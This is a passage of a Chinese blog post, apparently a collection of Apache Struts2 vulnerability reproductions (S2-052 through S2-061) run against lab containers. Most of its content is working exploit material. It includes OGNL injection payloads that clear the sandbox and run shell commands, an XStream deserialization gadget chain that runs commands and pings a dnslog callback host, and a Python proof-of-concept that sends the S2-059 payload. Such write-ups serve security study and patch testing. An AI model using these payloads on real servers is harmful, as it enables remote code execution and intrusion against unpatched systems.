+<h4 id="漏洞版本-11"><a href="#漏洞版本-11" class="headerlink" title="漏洞版本"></a>漏洞版本</h4><p>2.0.0 - 2.3.32</p>
+<h4 id="漏洞探测-12"><a href="#漏洞探测-12" class="headerlink" title="漏洞探测"></a>漏洞探测</h4><p>在<code>Gangster Name</code>这个表单中输入<code>$&#123;233*233&#125;</code>即可查看执行结果（剩下两个表单随意填写）</p>
+<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220310102426960.png" class title="image-20220310102426960">
+
+<p>表达式执行成功</p>
+<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220310102547071.png" class title="image-20220310102547071">
+
+<h4 id="漏洞利用-12"><a href="#漏洞利用-12" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p><strong>任意命令执行</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#x27;id&#x27;).getInputStream())).(#q)&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220310102720073.png" class title="image-20220310102720073">
+
+
+
+<h3 id="S2-052"><a href="#S2-052" class="headerlink" title="S2-052"></a>S2-052</h3><h4 id="漏洞简介-13"><a href="#漏洞简介-13" class="headerlink" title="漏洞简介"></a>漏洞简介</h4><p>Struts2-Rest-Plugin是让Struts2能够实现Restful API的一个插件，其根据Content-Type或URI扩展名来判断用户传入的数据包类型，有如下映射表：</p>
+<table>
+<thead>
+<tr>
+<th>扩展名</th>
+<th>Content-Type</th>
+<th>解析方法</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>xml</td>
+<td>application&#x2F;xml</td>
+<td>xstream</td>
+</tr>
+<tr>
+<td>json</td>
+<td>application&#x2F;json</td>
+<td>jsonlib或jackson(可选)</td>
+</tr>
+<tr>
+<td>xhtml</td>
+<td>application&#x2F;xhtml+xml</td>
+<td>无</td>
+</tr>
+<tr>
+<td>无</td>
+<td>application&#x2F;x-www-form-urlencoded</td>
+<td>无</td>
+</tr>
+<tr>
+<td>无</td>
+<td>multipart&#x2F;form-data</td>
+<td>无</td>
+</tr>
+</tbody></table>
+<p>jsonlib无法引入任意对象，而xstream在默认情况下是可以引入任意对象的（针对1.5.x以前的版本），方法就是直接通过xml的tag name指定需要实例化的类名：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;classname&gt;&lt;/classname&gt;</span><br><span class="line">//或者</span><br><span class="line">&lt;paramname class=&quot;classname&quot;&gt;&lt;/paramname&gt;</span><br></pre></td></tr></table></figure>
+
+<p>所以，我们可以通过反序列化引入任意类造成远程命令执行漏洞，只需要找到一个在Struts2库中适用的gedget。</p>
+<h4 id="漏洞版本-12"><a href="#漏洞版本-12" class="headerlink" title="漏洞版本"></a>漏洞版本</h4><p>2.1.2 -  2.3.33,</p>
+<p>2.5 -  2.5.12</p>
+<h4 id="漏洞探测-13"><a href="#漏洞探测-13" class="headerlink" title="漏洞探测"></a>漏洞探测</h4><p>启动环境后，访问<code>http://your-ip:8080/orders.xhtml</code>即可看到showcase页面。由于rest-plugin会根据URI扩展名或Content-Type来判断解析方法，所以我们只需要修改orders.xhtml为orders.xml或修改Content-Type头为application&#x2F;xml，即可在Body中传递XML数据。</p>
+<p>所以，最后发送的数据包为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">POST /orders/3/edit HTTP/1.1</span><br><span class="line">Host: your-ip:8080</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/xml</span><br><span class="line">Content-Length: 2415</span><br><span class="line"></span><br><span class="line">&lt;map&gt;</span><br><span class="line">  &lt;entry&gt;</span><br><span class="line">    &lt;jdk.nashorn.internal.objects.NativeString&gt;</span><br><span class="line">      &lt;flags&gt;0&lt;/flags&gt;</span><br><span class="line">      &lt;value class=&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;&gt;</span><br><span class="line">        &lt;dataHandler&gt;</span><br><span class="line">          &lt;dataSource class=&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;&gt;</span><br><span class="line">            &lt;is class=&quot;javax.crypto.CipherInputStream&quot;&gt;</span><br><span class="line">              &lt;cipher class=&quot;javax.crypto.NullCipher&quot;&gt;</span><br><span class="line">                &lt;initialized&gt;false&lt;/initialized&gt;</span><br><span class="line">                &lt;opmode&gt;0&lt;/opmode&gt;</span><br><span class="line">                &lt;serviceIterator class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;</span><br><span class="line">                  &lt;iter class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;</span><br><span class="line">                    &lt;iter class=&quot;java.util.Collections$EmptyIterator&quot;/&gt;</span><br><span class="line">                    &lt;next class=&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">                      &lt;command&gt;</span><br><span class="line">                        &lt;string&gt;touch&lt;/string&gt;</span><br><span class="line">                        &lt;string&gt;/tmp/success&lt;/string&gt;</span><br><span class="line">                      &lt;/command&gt;</span><br><span class="line">                      &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt;</span><br><span class="line">                    &lt;/next&gt;</span><br><span class="line">                  &lt;/iter&gt;</span><br><span class="line">                  &lt;filter class=&quot;javax.imageio.ImageIO$ContainsFilter&quot;&gt;</span><br><span class="line">                    &lt;method&gt;</span><br><span class="line">                      &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt;</span><br><span class="line">                      &lt;name&gt;start&lt;/name&gt;</span><br><span class="line">                      &lt;parameter-types/&gt;</span><br><span class="line">                    &lt;/method&gt;</span><br><span class="line">                    &lt;name&gt;foo&lt;/name&gt;</span><br><span class="line">                  &lt;/filter&gt;</span><br><span class="line">                  &lt;next class=&quot;string&quot;&gt;foo&lt;/next&gt;</span><br><span class="line">                &lt;/serviceIterator&gt;</span><br><span class="line">                &lt;lock/&gt;</span><br><span class="line">              &lt;/cipher&gt;</span><br><span class="line">              &lt;input class=&quot;java.lang.ProcessBuilder$NullInputStream&quot;/&gt;</span><br><span class="line">              &lt;ibuffer&gt;&lt;/ibuffer&gt;</span><br><span class="line">              &lt;done&gt;false&lt;/done&gt;</span><br><span class="line">              &lt;ostart&gt;0&lt;/ostart&gt;</span><br><span class="line">              &lt;ofinish&gt;0&lt;/ofinish&gt;</span><br><span class="line">              &lt;closed&gt;false&lt;/closed&gt;</span><br><span class="line">            &lt;/is&gt;</span><br><span class="line">            &lt;consumed&gt;false&lt;/consumed&gt;</span><br><span class="line">          &lt;/dataSource&gt;</span><br><span class="line">          &lt;transferFlavors/&gt;</span><br><span class="line">        &lt;/dataHandler&gt;</span><br><span class="line">        &lt;dataLen&gt;0&lt;/dataLen&gt;</span><br><span class="line">      &lt;/value&gt;</span><br><span class="line">    &lt;/jdk.nashorn.internal.objects.NativeString&gt;</span><br><span class="line">    &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../jdk.nashorn.internal.objects.NativeString&quot;/&gt;</span><br><span class="line">  &lt;/entry&gt;</span><br><span class="line">  &lt;entry&gt;</span><br><span class="line">    &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt;</span><br><span class="line">    &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt;</span><br><span class="line">  &lt;/entry&gt;</span><br><span class="line">&lt;/map&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>以上数据包成功执行的话，会在docker容器内创建文件<code>/tmp/success</code>，执行<code>docker-compose exec struts2 ls /tmp/</code>即可看到。</p>
+<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220310103905014.png" class title="image-20220310103905014">
+
+<h4 id="漏洞利用-13"><a href="#漏洞利用-13" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">&lt;map&gt;</span><br><span class="line">  &lt;entry&gt;</span><br><span class="line">    &lt;jdk.nashorn.internal.objects.NativeString&gt;</span><br><span class="line">      &lt;flags&gt;0&lt;/flags&gt;</span><br><span class="line">      &lt;value class=&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;&gt;</span><br><span class="line">        &lt;dataHandler&gt;</span><br><span class="line">          &lt;dataSource class=&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;&gt;</span><br><span class="line">            &lt;is class=&quot;javax.crypto.CipherInputStream&quot;&gt;</span><br><span class="line">              &lt;cipher class=&quot;javax.crypto.NullCipher&quot;&gt;</span><br><span class="line">                &lt;initialized&gt;false&lt;/initialized&gt;</span><br><span class="line">                &lt;opmode&gt;0&lt;/opmode&gt;</span><br><span class="line">                &lt;serviceIterator class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;</span><br><span class="line">                  &lt;iter class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;</span><br><span class="line">                    &lt;iter class=&quot;java.util.Collections$EmptyIterator&quot;/&gt;</span><br><span class="line">                    &lt;next class=&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">                      &lt;command&gt;</span><br><span class="line">                        &lt;string&gt; ping&lt;/string&gt;</span><br><span class="line">                        &lt;string&gt;test.oyyzjl.dnslog.cn&lt;/string&gt;</span><br><span class="line">                      &lt;/command&gt;</span><br><span class="line">                      &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt;</span><br><span class="line">                    &lt;/next&gt;</span><br><span class="line">                  &lt;/iter&gt;</span><br><span class="line">                  &lt;filter class=&quot;javax.imageio.ImageIO$ContainsFilter&quot;&gt;</span><br><span class="line">                    &lt;method&gt;</span><br><span class="line">                      &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt;</span><br><span class="line">                      &lt;name&gt;start&lt;/name&gt;</span><br><span class="line">                      &lt;parameter-types/&gt;</span><br><span class="line">                    &lt;/method&gt;</span><br><span class="line">                    &lt;name&gt;foo&lt;/name&gt;</span><br><span class="line">                  &lt;/filter&gt;</span><br><span class="line">                  &lt;next class=&quot;string&quot;&gt;foo&lt;/next&gt;</span><br><span class="line">                &lt;/serviceIterator&gt;</span><br><span class="line">                &lt;lock/&gt;</span><br><span class="line">              &lt;/cipher&gt;</span><br><span class="line">              &lt;input class=&quot;java.lang.ProcessBuilder$NullInputStream&quot;/&gt;</span><br><span class="line">              &lt;ibuffer&gt;&lt;/ibuffer&gt;</span><br><span class="line">              &lt;done&gt;false&lt;/done&gt;</span><br><span class="line">              &lt;ostart&gt;0&lt;/ostart&gt;</span><br><span class="line">              &lt;ofinish&gt;0&lt;/ofinish&gt;</span><br><span class="line">              &lt;closed&gt;false&lt;/closed&gt;</span><br><span class="line">            &lt;/is&gt;</span><br><span class="line">            &lt;consumed&gt;false&lt;/consumed&gt;</span><br><span class="line">          &lt;/dataSource&gt;</span><br><span class="line">          &lt;transferFlavors/&gt;</span><br><span class="line">        &lt;/dataHandler&gt;</span><br><span class="line">        &lt;dataLen&gt;0&lt;/dataLen&gt;</span><br><span class="line">      &lt;/value&gt;</span><br><span class="line">    &lt;/jdk.nashorn.internal.objects.NativeString&gt;</span><br><span class="line">    &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../jdk.nashorn.internal.objects.NativeString&quot;/&gt;</span><br><span class="line">  &lt;/entry&gt;</span><br><span class="line">  &lt;entry&gt;</span><br><span class="line">    &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt;</span><br><span class="line">    &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt;</span><br><span class="line">  &lt;/entry&gt;</span><br><span class="line">&lt;/map&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220310110008343.png" class title="image-20220310110008343">
+
+<h3 id="S2-053"><a href="#S2-053" class="headerlink" title="S2-053"></a>S2-053</h3><h4 id="漏洞简介-14"><a href="#漏洞简介-14" class="headerlink" title="漏洞简介"></a>漏洞简介</h4><p>Struts2在使用Freemarker模板引擎的时候，同时允许解析OGNL表达式。导致用户输入的数据本身不会被OGNL解析，但由于被Freemarker解析一次后变成离开一个表达式，被OGNL解析第二次，导致任意命令执行漏洞。</p>
+<h4 id="漏洞版本-13"><a href="#漏洞版本-13" class="headerlink" title="漏洞版本"></a>漏洞版本</h4><p>2.0.1 - 2.3.33</p>
+<p>2.5 -  2.5.10</p>
+<h4 id="漏洞探测-14"><a href="#漏洞探测-14" class="headerlink" title="漏洞探测"></a>漏洞探测</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%&#123;(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&#x27;id&#x27;).(#iswin=(@java.lang.System@getProperty(&#x27;os.name&#x27;).toLowerCase().contains(&#x27;win&#x27;))).(#cmds=(#iswin?&#123;&#x27;cmd.exe&#x27;,&#x27;/c&#x27;,#cmd&#125;:&#123;&#x27;/bin/bash&#x27;,&#x27;-c&#x27;,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="漏洞利用-14"><a href="#漏洞利用-14" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><h3 id="S2-057（CVE-2018-11776）"><a href="#S2-057（CVE-2018-11776）" class="headerlink" title="S2-057（CVE-2018-11776）"></a>S2-057（CVE-2018-11776）</h3><h4 id="漏洞简介-15"><a href="#漏洞简介-15" class="headerlink" title="漏洞简介"></a>漏洞简介</h4><p>当Struts2的配置满足以下条件时：</p>
+<ul>
+<li>alwaysSelectFullNamespace值为true</li>
+<li>action元素未设置namespace属性，或使用了通配符</li>
+</ul>
+<p>namespace将由用户从uri传入，并作为OGNL表达式计算，最终造成任意命令执行漏洞。</p>
+<h4 id="漏洞版本-14"><a href="#漏洞版本-14" class="headerlink" title="漏洞版本"></a>漏洞版本</h4><p>小于等于 Struts 2.3.34 与 Struts 2.5.16</p>
+<h4 id="漏洞探测-15"><a href="#漏洞探测-15" class="headerlink" title="漏洞探测"></a>漏洞探测</h4><p>测试OGNL表达式<code>$&#123;233*233&#125;</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://your-ip:8080/struts2-showcase/$%7B233*233%7D/actionChain1.action</span><br></pre></td></tr></table></figure>
+
+<p>返回表达式执行结果</p>
+<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220310111833429.png" class title="image-20220310111833429">
+
+<h4 id="漏洞利用-15"><a href="#漏洞利用-15" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p><strong>获取id信息</strong></p>
+<p>需要将其进行URL编码转换</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request[&#x27;struts.valueStack&#x27;].context).(#cr=#ct[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#a=@java.lang.Runtime@getRuntime().exec(&#x27;id&#x27;)).(@org.apache.commons.io.IOUtils@toString(#a.getInputStream()))&#125;</span><br></pre></td></tr></table></figure>
+
+<p>获取id信息值</p>
+<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220310113350760.png" class title="image-20220310113350760">
+
+
+
+<p><strong>获取当前用户</strong></p>
+<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220310113456090.png" class title="image-20220310113456090">
+
+<h3 id="S2-059-CVE-2019-0230"><a href="#S2-059-CVE-2019-0230" class="headerlink" title="S2-059  (CVE-2019-0230)"></a>S2-059  (CVE-2019-0230)</h3><h4 id="漏洞简介-16"><a href="#漏洞简介-16" class="headerlink" title="漏洞简介"></a>漏洞简介</h4><p>Apache Struts框架, 会对某些特定的标签的属性值，比如id属性进行二次解析，所以攻击者可以传递将在呈现标签属性时再次解析的OGNL表达式，造成OGNL表达式注入。从而可能造成远程执行代码。</p>
+<h4 id="漏洞版本-15"><a href="#漏洞版本-15" class="headerlink" title="漏洞版本"></a>漏洞版本</h4><p>2.0.0 -  2.5.20</p>
+<h4 id="漏洞探测-16"><a href="#漏洞探测-16" class="headerlink" title="漏洞探测"></a>漏洞探测</h4><p>访问 <code>http://your-ip:8080/?id=%25%7B233*233%7D</code>，可以发现233*233的结果被解析到了id属性中：</p>
+<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220310141627782.png" class title="image-20220310141627782">
+
+
+
+<h4 id="漏洞利用-16"><a href="#漏洞利用-16" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p><strong>poc</strong></p>
+<p>在tmp目录下创建success文件</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://ip:8080&quot;</span></span><br><span class="line">data1 = &#123;</span><br><span class="line">    <span class="string">&quot;id&quot;</span>: <span class="string">&quot;%&#123;(#context=#attr[&#x27;struts.valueStack&#x27;].context).(#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.setExcludedClasses(&#x27;&#x27;)).(#ognlUtil.setExcludedPackageNames(&#x27;&#x27;))&#125;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">data2 = &#123;</span><br><span class="line">    <span class="string">&quot;id&quot;</span>: <span class="string">&quot;%&#123;(#context=#attr[&#x27;struts.valueStack&#x27;].context).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec(&#x27;touch /tmp/success&#x27;))&#125;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">res1 = requests.post(url, data=data1)</span><br><span class="line"><span class="comment"># print(res1.text)</span></span><br><span class="line">res2 = requests.post(url, data=data2)</span><br><span class="line"><span class="comment"># print(res2.text)</span></span><br></pre></td></tr></table></figure>
+
+<p>创建文件成功</p>
+<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220310141245421.png" class title="image-20220310141245421">
+
+<h3 id="S2-061"><a href="#S2-061" class="headerlink" title="S2-061"></a>S2-061</h3><h4 id="漏洞简介-17"><a href="#漏洞简介-17" class="headerlink" title="漏洞简介"></a>漏洞简介</h4><p>S2-061是对S2-059的绕过，Struts2官方对S2-059的修复方式为加强OGNL表达式沙盒，而S2-061绕过了该沙盒</p>
+<h4 id="漏洞版本-16"><a href="#漏洞版本-16" class="headerlink" title="漏洞版本"></a>漏洞版本</h4><p>2.0.0 -  2.5.25</p>
+<h4 id="漏洞探测-17"><a href="#漏洞探测-17" class="headerlink" title="漏洞探测"></a>漏洞探测</h4><p>GNL表达式执行成功</p>
+<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220310145518461.png" class title="image-20220310145518461">
+
+
+
+<h4 id="漏洞利用-17"><a href="#漏洞利用-17" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=%25&#123;(%27Powered_by_Unicode_Potats0%2cenjoy_it%27).(%23UnicodeSec+%3d+%23application[%27org.apache.tomcat.InstanceManager%27]).(%23potats0%3d%23UnicodeSec.newInstance(%27org.apache.commons.collections.BeanMap%27)).(%23stackvalue%3d%23attr[%27struts.valueStack%27]).(%23potats0.setBean(%23stackvalue)).(%23context%3d%23potats0.get(%27context%27)).(%23potats0.setBean(%23context)).(%23sm%3d%23potats0.get(%27memberAccess%27)).(%23emptySet%3d%23UnicodeSec.newInstance(%27java.util.HashSet%27)).(%23potats0.setBean(%23sm)).(%23potats0.put(%27excludedClasses%27%2c%23emptySet)).(%23potats0.put(%27excludedPackageNames%27%2c%23emptySet)).(%23exec%3d%23UnicodeSec.newInstance(%27freemarker.template.utility.Execute%27)).(%23cmd%3d&#123;%27id%27&#125;).(%23res%3d%23exec.exec(%23cmd))&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>返回服务器id值</p>
+<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220310150417451.png" class title="image-20220310150417451">
+
+ 
+      <!-- reward -->
+      
+      <div id="reword-out">
+        <div id="reward-btn">
+          打赏
+        </div>
+      </div>
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <div class="declare">
+      <ul class="post-copyright">
+        <li>
+          <i class="ri-copyright-line"></i>
+          <strong>版权声明： </strong>
+          
+          本博客所有文章除特别声明外，著作权归作者所有。转载请注明出处！
+          
+        </li>
+      </ul>
+    </div>
+    
+    <footer class="article-footer">
+       
+<div class="share-btn">
+      <span class="share-sns share-outer">
+        <i class="ri-share-forward-line"></i>
+        分享
+      </span>
+      <div class="share-wrap">
+        <i class="arrow"></i>
+        <div class="share-icons">
+          
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="ri-weibo-fill"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="ri-wechat-fill"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="ri-qq-fill"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="ri-douban-line"></i>
+          </a>
+          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a> -->
+          
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="ri-facebook-circle-fill"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="ri-twitter-fill"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="ri-google-fill"></i>
+          </a>
+        </div>
+      </div>
+</div>
+
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div id="share-mask"></div>  
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web%E6%BC%8F%E6%B4%9E-OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F-Struts2%E6%BC%8F%E6%B4%9E/" rel="tag">-web漏洞 -OGNL表达式 -Struts2漏洞</a></li></ul>
+
+    </footer>
+  </div>
+
+   
+  <nav class="article-nav">
+    
+      <a href="/2022/03/05/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            OGNL表达式
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2022/03/04/%E3%80%90CVE-2022-22947%E3%80%91Spring%20Cloud%20Gateway%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title"></div>
+      </a>
+    
+  </nav>
+
+   
+<!-- valine评论 -->
+<div id="vcomments-box">
+  <div id="vcomments"></div>
+</div>
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="https://cdn.staticfile.org/valine/1.4.16/Valine.min.js"></script>
+<script>
+  new Valine({
+    el: "#vcomments",
+    app_id: "BAHT50PldtBLrMFvOb5LqqlL-gzGzoHsz",
+    app_key: "tj3HfiFvtJ3pRIhgXGBqdN7b",
+    path: window.location.pathname,
+    avatar: "monsterid",
+    placeholder: "给我的文章加点评论吧~",
+    recordIP: true,
+  });
+  const infoEle = document.querySelector("#vcomments .info");
+  if (infoEle && infoEle.childNodes && infoEle.childNodes.length > 0) {
+    infoEle.childNodes.forEach(function (item) {
+      item.parentNode.removeChild(item);
+    });
+  }
+</script>
+<style>
+  #vcomments-box {
+    padding: 5px 30px;
+  }
+
+  @media screen and (max-width: 800px) {
+    #vcomments-box {
+      padding: 5px 0px;
+    }
+  }
+
+  #vcomments-box #vcomments {
+    background-color: #fff;
+  }
+
+  .v .vlist .vcard .vh {
+    padding-right: 20px;
+  }
+
+  .v .vlist .vcard {
